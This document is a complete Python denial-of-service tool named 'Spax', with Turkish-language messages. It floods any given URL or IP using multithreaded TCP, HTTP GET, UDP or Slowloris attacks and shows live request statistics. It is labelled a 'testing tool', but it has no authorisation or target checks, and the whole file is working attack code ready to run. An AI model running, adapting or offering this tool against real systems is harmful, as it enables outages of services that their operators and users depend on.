import argparse
import socket
import threading
import time
import random
import sys
import signal
from urllib.parse import urlparse

class Colors:
    """Terminal renkleri"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'
    
class SpaxDoS:
    """Ana Spax DoS sınıfı"""
    
    def __init__(self):
        self.target_url = None
        self.target_ip = None
        self.target_hostname = None
        self.target_port = 80
        self.threads = []
        self.running = False
        self.stats = {
            'requests_sent': 0,
            'successful': 0,
            'failed': 0,
            'start_time': None
        }
        self.lock = threading.Lock()
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        """Ctrl+C ile cıkıs"""
        print(f"\n{Colors.YELLOW}[!] Saldırı durduruluyor...{Colors.END}")
        self.stop_attack()
        sys.exit(0)
    
    def parse_target(self, target):
        """Hedef URL'yi parse et"""
        try:
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            parsed = urlparse(target)
            self.target_url = target
            self.target_hostname = parsed.hostname
            self.target_ip = socket.gethostbyname(parsed.hostname)
            self.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            print(f"{Colors.GREEN}[+] Hedef: {target}{Colors.END}")
            print(f"{Colors.GREEN}[+] IP: {self.target_ip}:{self.target_port}{Colors.END}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}[-] Hedef parse hatası: {e}{Colors.END}")
            return False
    
    def update_stats(self, success=True):
        """İstatistikleri güncelle"""
        with self.lock:
            self.stats['requests_sent'] += 1
            if success:
                self.stats['successful'] += 1
            else:
                self.stats['failed'] += 1
    
    def print_stats(self):
        """İstatistikleri yazdır"""
        with self.lock:
            elapsed = time.time() - self.stats['start_time']
            rps = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"\r{Colors.CYAN}[*] İstek: {self.stats['requests_sent']} | "
                  f"Başarılı: {self.stats['successful']} | "
                  f"Başarısız: {self.stats['failed']} | "
                  f"RPS: {rps:.1f}{Colors.END}", end='', flush=True)
    
    def tcp_flood_worker(self):
        """TCP flood worker thread"""
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                s.send(random.randbytes(1024))
                s.close()
                self.update_stats(True)
            except Exception:
                self.update_stats(False)
                time.sleep(0.01)
    
    def http_flood_worker(self):
        """HTTP flood worker thread"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target_ip, self.target_port))
                user_agent = random.choice(user_agents)
                http_request = f"""GET / HTTP/1.1\r
Host: {self.target_hostname}\r
User-Agent: {user_agent}\r
Connection: keep-alive\r
\r
"""
                s.send(http_request.encode())
                s.recv(4096)
                s.close()
                self.update_stats(True)
            except Exception:
                self.update_stats(False)
                time.sleep(0.01)
    
    def udp_flood_worker(self):
        """UDP flood worker thread"""
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random.randbytes(1024), (self.target_ip, self.target_port))
                s.close()
                self.update_stats(True)
            except Exception:
                self.update_stats(False)

    def slowloris_worker(self):
        """Slowloris saldırısı"""
        connections = []
        while self.running:
            try:
                if len(connections) < 200:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)
                    s.connect((self.target_ip, self.target_port))
                    s.send(b"GET / HTTP/1.1\r\n")
                    s.send(f"Host: {self.target_hostname}\r\n".encode())
                    connections.append(s)
                    self.update_stats(True)
                
                for conn in connections[:]:
                    try:
                        conn.send(b"X-a: b\r\n")
                    except socket.error:
                        connections.remove(conn)
                
                time.sleep(15)
            except Exception:
                self.update_stats(False)
                time.sleep(1)
    
    def start_attack(self, attack_type='http', threads=50, duration=None):
        """Saldırıyı başlat"""
        attack_methods = {
            'tcp': self.tcp_flood_worker,
            'http': self.http_flood_worker,
            'udp': self.udp_flood_worker,
            'slow': self.slowloris_worker
        }
        
        if attack_type not in attack_methods:
            print(f"{Colors.RED}[-] Geçersiz saldırı türü: {attack_type}{Colors.END}")
            return
        
        worker_method = attack_methods[attack_type]
        
        print(f"\n{Colors.YELLOW}[*] Saldırı başlatılıyor...{Colors.END}")
        print(f"{Colors.CYAN}[*] Tür: {attack_type.upper()}, Thread: {threads}, Süre: {'Sınırsız' if not duration else str(duration) + 's'}{Colors.END}")
        print(f"{Colors.YELLOW}[*] Durdurmak için Ctrl+C{Colors.END}\n")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        for i in range(threads):
            t = threading.Thread(target=worker_method, daemon=True)
            t.start()
            self.threads.append(t)
        
        start_time = time.time()
        try:
            while self.running:
                self.print_stats()
                time.sleep(0.5)
                if duration and (time.time() - start_time) >= duration:
                    break
        except KeyboardInterrupt:
            pass
        
        self.stop_attack()
    
    def stop_attack(self):
        """Saldırıyı durdur"""
        if not self.running:
            return
        self.running = False
        
        print(f"\n\n{Colors.GREEN}[+] Saldırı tamamlandı!{Colors.END}")
        
        elapsed = time.time() - self.stats['start_time']
        rps = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
        
        print(f"{Colors.CYAN}[*] Toplam İstek: {self.stats['requests_sent']}{Colors.END}")
        print(f"{Colors.CYAN}[*] Başarılı: {self.stats['successful']}{Colors.END}")
        print(f"{Colors.CYAN}[*] Başarısız: {self.stats['failed']}{Colors.END}")
        print(f"{Colors.CYAN}[*] Ortalama RPS: {rps:.2f}{Colors.END}")
        print(f"{Colors.CYAN}[*] Toplam Süre: {elapsed:.2f}s{Colors.END}")

def main():
    """Ana fonksiyon - Sadeleştirildi"""
    parser = argparse.ArgumentParser(description='Spax - DoS Testing Tool')
    
    parser.add_argument('-d', '--target', required=True, help='Hedef URL veya IP')
    parser.add_argument('-m', '--method', choices=['http', 'tcp', 'udp', 'slow'], default='http', help='Saldırı türü')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Thread sayısı')
    parser.add_argument('-s', '--seconds', type=int, help='Saldırı süresi (saniye)')
    parser.add_argument('-q', '--quiet', action='store_true', help='Giriş mesajlarını gizle (BAT tarafından kullanılır)')
    
    args = parser.parse_args()
    
    spax = SpaxDoS()
    
    
    if not spax.parse_target(args.target):
        sys.exit(1)
    
    try:
        spax.start_attack(
            attack_type=args.method,
            threads=args.threads,
            duration=args.seconds
        )
    except Exception as e:
        print(f"\n{Colors.RED}[-] Hata: {e}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()